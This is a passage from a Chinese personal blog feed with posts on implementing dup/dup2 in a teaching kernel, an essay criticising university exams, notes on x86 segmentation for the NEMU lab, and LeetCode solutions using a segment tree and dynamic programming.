<p>在这个函数中，我们传入参数位置以及文件，其中<code>argint</code>函数可以通过参数的位置或者文件描述符，再由文件描述符判断传入的文件是否合理。</p>
<p>其中，<code>fdalloc</code>函数是在<code>ofile</code>（即打开的文件）中选择空位，如果有空位，就把文件插入进去，将数组下标作为文件描述符返回：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fdalloc(struct file *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(fd = <span class="number">0</span>; fd &lt; NOFILE; fd++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(curproc-&gt;ofile[fd] == <span class="number">0</span>)&#123;</span><br><span class="line">      curproc-&gt;ofile[fd] = f;</span><br><span class="line">      <span class="keyword">return</span> fd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>随后调用<code>filedup</code>函数，将当前复制文件的引用加上一：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Increment ref count for file f.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>*</span></span><br><span class="line"><span class="class"><span class="title">filedup</span>(<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  acquire(&amp;ftable.lock);</span><br><span class="line">  <span class="keyword">if</span>(f-&gt;ref &lt; <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;filedup&quot;</span>);</span><br><span class="line">  f-&gt;ref++;</span><br><span class="line">  release(&amp;ftable.lock);</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上就是<code>dup</code>的实现过程。</p>
<p><code>dup2</code>函数跟<code>dup</code>函数相似，但<code>dup2</code>函数允许调用者规定一个有效描述符和目标描述符的id。<code>dup2</code>函数成功返回时，目标描述符（<code>dup2</code>函数的第二个参数）将变成源描述符（<code>dup2</code>函数的第一个参数）的复制品，换句话说，两个文件描述符现在都指向同一个文件，并且是函数第一个参数指向的文件。</p>
<p>而实现<code>dup2</code>函数就需要将第二个参数的文件描述符指向第一个参数的文件描述符，并将第二个文件描述符所指向的文件关掉。因此需要接受两个文件，老文件和新文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">oldfile</span>, *<span class="title">newfile</span>;</span></span><br></pre></td></tr></table></figure>
<p>其中，当有用户态切换到内核态时，新文件是第一个参数，老文件在第二个参数，因此新文件先被压入栈中，老文件后被压入栈中，因此我们需要先对参数进行判断并且取出文件描述符：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(argfd(<span class="number">0</span>, <span class="number">0</span>, &amp;oldfile) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argint(<span class="number">1</span>, &amp;newfd) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中，我们需要通过<code>argfd</code>函数来获取已经打开了的老文件，通过<code>argint</code>来获取新文件的文件描述符。</p>
<p>接下来需要判断新文件描述符是否超出范围：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(newfd &lt; <span class="number">0</span> || newfd &gt;= NOFILE)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>最后则将新的文件描述符指向老文件，需要注意的是，这里也需要进行一些不合理情况的判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(currproc-&gt;ofile[newfd] == <span class="number">0</span>)&#123;</span><br><span class="line">    currproc-&gt;ofile[newfd] = oldfile;</span><br><span class="line">    filedup(oldfile);</span><br><span class="line">    <span class="keyword">return</span> newfd;</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(argfd(<span class="number">1</span>, &amp;newfd, &amp;newfile) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(oldfile == newfile)&#123;</span><br><span class="line">    <span class="keyword">return</span> newfd;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(oldfile-&gt;ref &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    fileclose(oldfile);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  currproc-&gt;ofile[newfd] = oldfile;</span><br><span class="line">  filedup(oldfile);</span><br><span class="line">  <span class="keyword">return</span> newfd;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>我为什么讨厌考试</title>
    <url>/2020/12/22/Hate-exam/</url>
    <content><![CDATA[<p>为什么我讨厌考试？这似乎是一句吃不到葡萄说葡萄酸的话，说这句话的人，大多数会被认为是懒惰的，因为他们对待学习不努力以及不思进取所以才会抱怨考试无聊，表示自己其实有学习的能力，只不过不愿意学罢了。在我上大学之前，我也是这么认为的。作为一名中流985大学的学生，我甚至可以说我是考试的受益者，毕竟我也是通过高考选拔上来的。</p>
<p>然而，上了大学，我发现一切都变了，大部分的考试变得无趣又无意义，甚至许多课程本身就毫无意义可言，一门毫无意义的课程，却占着很高的学分，毕业和保研的命脉掌握在它们的手中，你不去学就意味着你就冒着挂科的风险，一旦有一门挂科，就意味着大部分的评奖评优和保研完全没戏了。</p>
<p>虽然一直对大学的课程不太满意，但真正使我决定写下这篇文章的是在我复习《算法设计与分析》这门课的时候。作为一门实践性很强的科目，上课的时候居然连一些实践的作业都没有，唯一的实践机会是在小组组队实现算法的时候。而在我复习的时候在做往年试卷的时候，其中有一道题是，用两种状态空间树的方法来表示回溯法和分支限界法的解空间，我当时是极其愤怒的，这种题目，不就像是孔乙己在问别人，茴字的写法有几种吗？像这种无聊又无用的题目在不同科目的不同试卷中比比皆是。</p>
<p>当我在复习的时候，我完全无法专注，只得逼迫自己来复习，因为我对考试完全没有热情，然而这种效率是极其低下的。在我刚上大学的时候，我还好好复习功课希望去得到一个好的成绩。然而现在我只想赶快考完了事，只要不挂科就行，因为我真正单纯地认为，这种考试完全无法对我的能力有很大的提升，而我也认为，这种考试也不能检验出一个人的能力如何。作为一个实践性极强的专业，我不认为这种考试可以评价一个人的水平如何。当然，我也认为，我不应该被这种考试所评判。</p>
<p>中国的大学的教育更像是延续了高中的应试教育，然而它却只继承了高中教育的缺点，一切为应试做准备。落后的评级制度也诞生了许多很不称职的教师，他们只会单调呆板地念着数十年如一日的PPT。而真正钻研教学的老师，却无法得到升迁。</p>
<p>中国的高等教育，确实应该改革了…</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>教育</tag>
      </tags>
  </entry>
  <entry>
    <title>NEMU PA3</title>
    <url>/2020/12/09/NEMU%20PA3/</url>
    <content><![CDATA[<p><strong>段描述符：</strong></p>
<p><img src="/2020/12/09/NEMU%20PA3/segment_descriptor.png" alt></p>
<p>1.<strong>CR0寄存器(control register 0)</strong>： PE位。计算机可以决定自己留在哪个世界</p>
<p>2.<strong>GDT(Global Descriptor Table, 全局描述符表)</strong>, 数组的一个元素就是一个段描述符。这样一来就可以通过下标索引的方法来找到所有的段描述符。于是在 80386 的世界里, 原来的段寄存器就用来存放段描述符的索引, 另外还包含了一些属性, 这样的一个结构叫<strong>段选择符(Selector)</strong></p>
<p>3.在 80386 中引入一个<strong>寄存器 GDTR</strong>, 专门用来存放 GDT 的首地址和长度。需要注意的是, 这个首地址是线性地址, 使用这个地址的时候不需要再次经过分段机制的地址转换。最后 80386 和操作系统约定, 让操作系统事先把GDT 准备好, 然后通过一条特殊的指令把 GDT 的首地址和长度装载到 GDTR 中, 计算机就可以开启上述的分段机制了。</p>
<p>4.在段描述符中含有一个 <strong>DPL 域(Descriptor Privilege Level)</strong>, 它描述了一个段所在的特权级。</p>
<p>5.在段选择符中含有一个 <strong>RPL 域(Requestor’s Privilege Level)</strong>, 它描述了请求者所在的特权级。</p>
<p>6.**CPL(Current Privilege Level)**指示当前进程的特权级, 一般来说它和当前CS 寄存器所指向的段描述符(也就是当前进程的代码段)的 DPL 相等。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode307-区域和检索</title>
    <url>/2020/10/15/LeetCode307-%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>给定一个整数数组 nums，求出数组从索引 i 到 j  (i ≤ j) 范围内元素的总和，包含 i,  j 两点。</p>
<p>update(i, val) 函数可以通过将下标为 i 的数值更新为 val，从而对数列进行修改。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Given nums &#x3D; [1, 3, 5]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 9</span><br><span class="line">update(1, 2)</span><br><span class="line">sumRange(0, 2) -&gt; 8</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="thought"><a class="markdownIt-Anchor" href="#thought"></a> Thought</h2>
<h3 id="segement-tree线段树"><a class="markdownIt-Anchor" href="#segement-tree线段树"></a> Segement Tree(线段树)</h3>
<p>一颗线段树的构造就是根据区间的性质的来构造的, 如下是一棵区间<code>[0, 3]</code>的线段树，每个<code>[start, end]</code>都是一个二叉树中的节点。</p>
<pre class="mermaid">graph TD;
	A["[0,3]"] --> B["[0,1]"];
	A["[0,3]"] --> C["[2,3]"];
	B --> D["[0,0]"];
	B --> E["[1,1]"];
	C --> F["[2,2]"];
	C --> G["[3,3]"];</pre>
<p>区间划分大概就是上述的区间划分。可以看出每次都将区间的长度一分为二,数列长度为<code>n</code>,所以线段树的高度是<code>log(n)</code>,这是很多高效操作的基础。<br>
上述的区间存储的只是区间的左右边界。我们可以将区间的最大值加入进来,也就是树中的<code>Node</code>需要存储<code>left</code>，<code>right</code>左右子节点外，还需要存储<code>start</code>, <code>end</code>, <code>val</code>区间的范围和区间内表示的值。</p>
<p><strong>可以储存不同的值，例如区间内的最大值，最小值，区间的求和等等。</strong></p>
<p>因为每次将区间的长度一分为二,所有创造的节点个数，即底层有<code>n</code>个节点，那么倒数第二次约<code>n/2</code>个节点，倒数第三次约<code>n/4</code>个节点，依次类推：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n + 1&#x2F;2 * n + 1&#x2F;4 * n + 1&#x2F;8 * n + ...</span><br><span class="line">&#x3D;   (1 + 1&#x2F;2 + 1&#x2F;4 + 1&#x2F;8 + ...) * n</span><br><span class="line">&#x3D;   2n</span><br></pre></td></tr></table></figure>
<p><strong>所以构造线段树的时间复杂度和空间复杂度都为<code>O(n)</code>。</strong></p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">segmentTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">start,end,sum</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.start = start;</span><br><span class="line">        <span class="built_in">this</span>.end = end;</span><br><span class="line">        <span class="built_in">this</span>.sum = sum;</span><br><span class="line">        <span class="built_in">this</span>.left = <span class="built_in">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> NumArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(nums.length);</span></span><br><span class="line">    <span class="built_in">this</span>.segmentTree = build(<span class="number">0</span>,nums.length-<span class="number">1</span>,nums);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> build = <span class="function"><span class="keyword">function</span>(<span class="params">left,right,array</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">left &gt; right</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> root = <span class="keyword">new</span> segmentTree(left,right,array[left]);</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">left === right</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((left+right)/<span class="number">2</span>);</span><br><span class="line">    root.left = build(left,mid,array);</span><br><span class="line">    root.right = build(mid+<span class="number">1</span>,right,array);</span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NumArray.prototype.update = <span class="function"><span class="keyword">function</span>(<span class="params">i,val</span>) </span>&#123;</span><br><span class="line">    modify(<span class="built_in">this</span>.segmentTree,i,val);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> modify = <span class="function"><span class="keyword">function</span>(<span class="params">root,index,value</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root.start == index &amp;&amp; root.end == index</span>)</span>&#123;</span><br><span class="line">        root.sum = value;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">index&lt;=mid</span>)</span>&#123;</span><br><span class="line">        modify(root.left,index,value);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        modify(root.right,index,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> </span>i </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">j</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">NumArray.prototype.sumRange = <span class="function"><span class="keyword">function</span>(<span class="params">i,j</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="built_in">this</span>.segmentTree);</span><br><span class="line">   <span class="keyword">let</span> res = query(<span class="built_in">this</span>.segmentTree,i,j);</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> query = <span class="function"><span class="keyword">function</span>(<span class="params">root,start,end</span>)</span>&#123;</span><br><span class="line">     <span class="function"><span class="title">if</span>(<span class="params">start == root.start &amp;&amp; root.end == end</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root.sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> leftsum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> rightsum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//左子区</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">mid &gt;= start</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">mid&lt;end</span>)</span>&#123;</span><br><span class="line">            leftsum = query(root.left,start,mid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            leftsum = query(root.left,start,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右子区</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">mid&lt;end</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">start &lt;= mid</span>)</span>&#123;</span><br><span class="line">            rightsum = query(root.right,mid+<span class="number">1</span>,end);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            rightsum = query(root.right,start,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leftsum+rightsum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode416-分割等和子集</title>
    <url>/2020/10/11/LeetCode416-%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>给定一个<strong>只包含正整数</strong>的<strong>非空</strong>数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 5, 11, 5]</span><br><span class="line"></span><br><span class="line">输出: true</span><br><span class="line"></span><br><span class="line">解释: 数组可以分割成 [1, 5, 5] 和 [11].</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 2, 3, 5]</span><br><span class="line"></span><br><span class="line">输出: false</span><br><span class="line"></span><br><span class="line">解释: 数组不能分割成两个元素和相等的子集.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="thought"><a class="markdownIt-Anchor" href="#thought"></a> Thought</h2>
<p>由于所给数组的规模不确定，所要分成的数组的规模的大小，所以不能使用循环嵌套的方法遍历所有可能性，即不能在多项式时间内解决（NP问题）。如果使用贪心则只能求得局部最优解而不能取得全局的解。因此此题需要使用记忆性搜索或者动态规划的方法来解决。</p>
<p>考虑到对于任意一个数我们都有选择或者不选这两种选择，因为我们可以开一个二维数组dp[n][target+1]，其中n表示nums数组中的数据大小。target表示将nums数组中的数据进行累计求和后得到的和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{sum}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mathdefault mtight">u</span><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，对于数组中的任意位置dp[i][j],表示的是当选择到第i个数的时候是否可以达到j的值。</p>
<p>在进行动态规划之前我们应当去考虑临界条件。首先，当nums数组的规模小于2时，必定没有解，因此直接返回false；当maxNum大于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>n</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{n}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时，也不可能找到解，因此直接返回false；当sum为奇数时，说明不可能等分为两个同样的集合，因此也直接返回false。</p>
<p>首先要将整个dp数组进行初始化，即将整个数组都设为false。然后我们需要考虑对dp数组的初始状态进行设置。考虑到当j=0即当没有num被选择时，应当将这一列全部设置为true。当nums[0]被选择时，也应当将dp[0][nums[0]]的值设置为true。</p>
<p>将dp数组初始化之后我们就需要对数组进行状态转移，考虑到对于任意的i,j的状态数组dp[i][j]，当此时所选择的nums[i]大于j时，此时nums[i]一定不能被选择，那么此时的状态即为dp[i][j] = dp[i-1][j],当nums[i]&lt;j时，那么表明当前的数据nums[i]可以被选择，那么此时的状态就可以有两种选择dp[i-1][j]和dp[i-1][j-nums[i]]，因此状态转移方程如下：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mspace width="1em"><mi mathvariant="normal">∣</mi><mspace width="1em"><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>n</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mspace></mspace></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">dp[i][j] = \begin{cases}
dp[i-1][j] \\
dp[i-1][j] \quad|\quad dp[i-1][j-nums[i]]
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:1em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number[]&#125;</span> <span class="variable">nums</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;boolean&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> canPartition = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = nums.length;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">2</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> maxNum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i=<span class="number">0</span>; i&lt;n; i++</span>)</span>&#123;</span><br><span class="line">        sum+=nums[i];</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">nums[i]&gt;maxNum</span>)</span>&#123;</span><br><span class="line">            maxNum = nums[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span>(sum &amp; <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> target = sum/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(maxNum&gt;target)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//initial dp array</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i=<span class="number">0</span>;i&lt;n;i++</span>)</span>&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(target+<span class="number">1</span>);</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j=<span class="number">0</span>;j&lt;=target;j++</span>)</span>&#123;</span><br><span class="line">            dp[i][j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//set dp[i][0] = 1 because no value is selected</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i=<span 